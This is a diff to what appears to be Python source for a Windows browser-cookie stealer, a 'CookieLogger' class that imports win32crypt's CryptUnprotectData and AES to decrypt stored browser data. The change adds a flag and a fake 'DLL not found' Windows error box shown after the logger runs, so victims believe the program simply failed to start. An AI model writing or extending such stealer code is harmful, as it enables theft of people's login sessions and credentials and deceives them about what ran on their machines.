@@ -14,6 +14,8 @@ import subprocess
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES 
 
+show_fake_error: bool = True
+
 def safe(func):
     def wrapper(*args, **kwargs):
         try:
@@ -27,7 +29,7 @@ def dll_name() -> str:
     
     return random.choice(dll_list)
 
-def message_box() -> bool:
+def fake_error_message_box() -> bool:
     ctypes.windll.user32.MessageBoxW(None, f"This application failed to start because {dll_name()} was not found. Re-installing the application may fix this problem.", "Windows - System Error", 0)
 
 class CookieLogger:
@@ -171,3 +173,12 @@ class CookieLogger:
 
 if __name__ == "__main__":
     CookieLogger()
+    
+    if show_fake_error == True:
+        try:
+            fake_error_message_box()
+        except:
+            pass
+    else:
+        pass
+    
